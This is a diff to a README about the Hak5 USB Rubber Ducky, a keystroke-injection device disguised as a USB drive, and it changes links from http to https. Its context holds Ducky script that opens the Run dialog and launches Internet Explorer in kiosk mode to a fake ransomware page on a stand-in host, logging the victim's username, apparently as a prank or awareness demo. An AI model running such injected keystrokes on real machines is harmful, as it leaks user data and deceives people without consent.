@@ -22,7 +22,7 @@ screen.
 USB Rubber Ducky is a product made by a company called Hak5.  You can find
 information about it at:
 
-* [Hak5's hackshop.com](http://hakshop.com/products/usb-rubber-ducky-deluxe)
+* [Hak5's hackshop.com](https://hakshop.com/products/usb-rubber-ducky-deluxe)
 * [Hak5's GitHub Repository](https://github.com/hak5darren/USB-Rubber-Ducky)
 
 To you, it looks like a USB thumb drive, but it actually emulates a USB HID
@@ -99,14 +99,14 @@ REM run dialog
 GUI r
 
 REM the double quotes are important
-STRING_DELAY 10 "c:\Program Files\internet explorer\iexplore.exe" -k http://fake-ransomeware-page.example.com/log/%username%
+STRING_DELAY 10 "c:\Program Files\internet explorer\iexplore.exe" -k https://fake-ransomeware-page.example.com/log/%username%
 ENTER
 
 
 REM open a second one and put on the second monitor
 
 GUI r
-STRING_DELAY 10 "c:\Program Files\internet explorer\iexplore.exe" -k http://fake-ransomeware-page.example.com/log/%username%
+STRING_DELAY 10 "c:\Program Files\internet explorer\iexplore.exe" -k https://fake-ransomeware-page.example.com/log/%username%
 ENTER
 
 
